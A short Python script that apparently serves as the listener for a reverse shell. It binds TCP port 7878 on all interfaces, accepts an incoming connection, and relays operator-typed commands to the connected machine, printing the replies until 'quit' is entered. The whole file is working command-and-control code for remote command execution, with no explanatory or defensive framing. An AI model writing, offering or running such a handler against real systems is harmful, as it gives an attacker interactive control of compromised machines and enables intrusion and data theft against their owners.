import socket
import sys


def create_socket():
    global host
    global port
    global soc
    
    host = ''
    port = 7878
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def bind_socket():
    try:
        global host
        global port
        global soc

        soc.bind((host, port))

        soc.listen(5)
        print('[+] listening for incoming connection...')

        conn, clientAddress = soc.accept()
        print('[i] connected to {}'.format(clientAddress))
        send_command(conn)
        conn.close()
    except ConnectionResetError:
        print('[!] Connection lost!')


def send_command(conn):
    while True:
        command = input('[in]>>')
        if 'quit' in command:
            conn.send(str.encode(command))
            conn.close()
            sys.exit()
        else:
            conn.send(str.encode(command))
            receive_response(conn)


def receive_response(conn):
    response = conn.recv(1024)
    print(str(response, 'utf-8'))


def main():
    create_socket()
    bind_socket()


main()
